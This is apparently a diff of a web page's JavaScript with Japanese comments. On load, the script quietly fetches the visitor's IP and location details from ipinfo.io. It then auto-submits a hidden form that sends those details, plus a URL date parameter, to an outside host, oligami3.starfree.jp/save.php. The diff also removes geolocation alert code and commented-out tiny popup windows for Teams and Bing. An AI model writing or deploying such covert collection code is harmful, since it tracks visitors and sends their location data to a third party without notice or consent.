@@ -1,23 +1,19 @@
-var newWindow;
 window.onload = async function() {
   // window.navigator.vibrate([100,30,100,30,100,30,200,30,200,30,200,30,100,30,100,30,100]); // モールス信号で 'SOS' とバイブレーション
   // var top = window.innerHeight;
   // var right = window.innerWidth;
-  // getTeams();
 
-  // var newWindow = window.open("https://teams.microsoft.com/_#/apps", "null", 'top=-10,left=-10,width=10,height=10');
-  // newWindow = window.open("https://www.google.co.jp/maps/", "null");
-  // if( newWindow ) {
-  //   console.log('正常に開きました');
-    getTeams();
-  // }
-  // else {
-  //   console.log('正常に開けませんでした！');
-  //   newWindow.close();
-  // }
-  const request = await fetch("https://ipinfo.io/json")
-  const ip = await request.json()
-  console.log(ip)
+  /*var newWindow = window.open("https://teams.microsoft.com/_#/apps", "null", 'top=-10,left=-10,width=10,height=10');
+  var newWindow = window.open("https://www.bing.com/work/search?q=%E3%83%A6%E3%83%BC%E3%82%B6%E3%83%BC&qs=n&form=QBRE&msbsrank=0_2_Person_2&sp=-1&pq=a&sc=2-1&sk=&cvid=BF6200994487484F833ACDA72F6EDBF5", "null");
+  if( newWindow ) {
+    console.log('正常に開きました');
+  }
+  else {
+    console.log('正常に開けませんでした！');
+    newWindow.close();
+  }*/
+  const request = await fetch("https://ipinfo.io/json");
+  const ip = await request.json();
   submitForm(ip);
 };
 
@@ -25,7 +21,7 @@ async function submitForm (ip) {
   // form を動的に生成
   var form = document.createElement('form');
   form.action = 'http://oligami3.starfree.jp/save.php';
-  form.method = 'POST';
+  form.method = 'GET';
 
   // body に追加
   document.body.append(form);
@@ -88,54 +84,25 @@ async function submitForm (ip) {
     fd.set('ipinfo.postal', ip.postal); //
     fd.set('ipinfo.region', ip.region); //
     fd.set('ipinfo.timezone', ip.timezone); //
+    fd.set('dateAndTime', getParameter()["dateAndTime"]);
   });
 
   // submit
   form.submit();
 }
 
-function sleep(msec) {
- return new Promise(function(resolve) {
-  setTimeout(function() {resolve()}, msec);
- })
-}
-
-async function getTeams () {
-  // var doc = newWindow.document;
-  // console.log("href");
-  // console.log(doc);
-  // await sleep(1000);
-  // console.log("equal");
-
-  navigator.geolocation.getCurrentPosition( successFunc , errorFunc , optionObj ) ;
-
-  // console.log("equal5");
-}
-// 成功した時の関数
-function successFunc (position) {
-	// 緯度をアラート表示
-	alert( position.coords.latitude ) ;
-	// 経度をアラート表示
-	alert( position.coords.longitude ) ;
-}
-
-// 失敗した時の関数
-function errorFunc( error )
-{
-	// エラーコードのメッセージを定義
-	var errorMessage = {
-		0: "原因不明のエラーが発生しました…。" ,
-		1: "位置情報の取得が許可されませんでした…。" ,
-		2: "電波状況などで位置情報が取得できませんでした…。" ,
-		3: "位置情報の取得に時間がかかり過ぎてタイムアウトしました…。" ,
-	};
-	// エラーコードに合わせたエラー内容をアラート表示
-	alert( errorMessage[error.code] ) ;
-}
-
-// オプション・オブジェクト
-var optionObj = {
-	"enableHighAccuracy": true ,
-	"timeout": 8000 ,
-	"maximumAge": 5000 ,
+function getParameter(){
+	var paramsArray = [];
+	var url = location.href;
+	var parameters = url.split("#");
+	if( parameters.length > 1 ) url = parameters[0];
+  parameters = url.split("?");
+	if( parameters.length > 1 ) {
+		var params	 = parameters[1].split("&amp;");
+		for ( i = 0; i < params.length; i++ ) {
+		   var paramItem = params[i].split("=");
+		   paramsArray[paramItem[0]] = paramItem[1];
+		}
+	}
+	return paramsArray;
 };
